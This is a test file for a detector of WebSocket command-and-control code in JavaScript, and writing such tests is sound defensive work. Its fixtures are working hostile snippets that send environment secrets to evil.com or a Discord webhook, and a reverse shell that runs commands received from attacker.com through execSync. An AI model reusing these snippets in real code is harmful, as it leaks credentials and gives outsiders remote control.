import { describe, it, expect } from 'vitest';
import { detectWebSocketC2 } from '../src/websocket-c2.js';

describe('detectWebSocketC2', () => {
  it('detects hardcoded WebSocket C2 connection', () => {
    const code = `const ws = new WebSocket('wss://c2.evil.com/control');`;
    const result = detectWebSocketC2(code);
    expect(result.hasWebSocketC2).toBe(true);
    expect(result.findings.some(f => f.type === 'c2_connection')).toBe(true);
    expect(result.connections.length).toBe(1);
    expect(result.connections[0].url).toBe('wss://c2.evil.com/control');
  });

  it('detects WebSocket message handler with data exfiltration', () => {
    const code = `
      ws.onmessage = function(event) {
        const data = process.env.SECRET_KEY;
        fetch('https://evil.com/exfil', { method: 'POST', body: data });
      };
    `;
    const result = detectWebSocketC2(code);
    expect(result.hasWebSocketC2).toBe(true);
  });

  it('detects WebSocket reverse shell pattern', () => {
    const code = `
      const ws = new WebSocket('wss://attacker.com/shell');
      ws.on('message', function(data) {
        const { execSync } = require('child_process');
        execSync(data.toString());
      });
    `;
    const result = detectWebSocketC2(code);
    expect(result.hasWebSocketC2).toBe(true);
    expect(result.findings.some(f => f.type === 'reverse_shell')).toBe(true);
  });

  it('detects dynamic URL WebSocket connection', () => {
    const code = `const ws = new WebSocket(serverUrl);`;
    const result = detectWebSocketC2(code);
    expect(result.hasWebSocketC2).toBe(true);
    expect(result.findings.some(f => f.type === 'dynamic_url')).toBe(true);
    expect(result.connections.some(c => c.isDynamic)).toBe(true);
  });

  it('detects WebSocket data exfiltration channel', () => {
    const code = `
      const token = process.env.API_TOKEN;
      ws.send(JSON.stringify({ token }));
    `;
    const result = detectWebSocketC2(code);
    expect(result.hasWebSocketC2).toBe(true);
    expect(result.findings.some(f => f.type === 'data_exfil_channel')).toBe(true);
  });

  it('flags suspicious WebSocket URLs', () => {
    const code = `const ws = new WebSocket('wss://abc123.ngrok.io/tunnel');`;
    const result = detectWebSocketC2(code);
    expect(result.connections.length).toBe(1);
    expect(result.connections[0].suspiciousIndicators).toContain('ngrok tunnel');
  });

  it('detects binary payload handling in WebSocket', () => {
    const code = `
      ws.addEventListener('message', function(event) {
        const buffer = new Uint8Array(event.data);
        processBinary(buffer);
      });
    `;
    const result = detectWebSocketC2(code);
    expect(result.hasWebSocketC2).toBe(true);
    expect(result.findings.some(f => f.type === 'binary_payload')).toBe(true);
  });

  it('identifies reverse shell with high confidence', () => {
    const code = `
      const ws = new WebSocket('wss://evil.ngrok.io/shell');
      ws.on('message', function(cmd) { require('child_process').execSync(cmd); });
    `;
    const result = detectWebSocketC2(code);
    expect(result.confidence).toBeGreaterThanOrEqual(0.9);
    expect(result.severity).toBe('critical');
  });

  it('assigns lower severity for clean WebSocket without exfiltration', () => {
    const code = `
      const socket = new WebSocket('wss://api.example.com/ws');
      socket.onopen = function() { console.log('connected'); };
      socket.onclose = function() { console.log('disconnected'); };
    `;
    const result = detectWebSocketC2(code);
    expect(result.findings.every(f => f.severity !== 'critical' || f.type === 'c2_connection')).toBe(true);
    expect(result.connections.some(c => !c.isDynamic)).toBe(true);
  });

  it('detects Discord webhook WebSocket exfiltration', () => {
    const code = `
      const ws = new WebSocket('wss://discord.com/api/webhooks/12345/abcdef');
      ws.send(JSON.stringify({ content: process.env.AWS_SECRET_KEY }));
    `;
    const result = detectWebSocketC2(code);
    expect(result.connections.some(c => c.suspiciousIndicators.includes('Discord webhook'))).toBe(true);
  });
});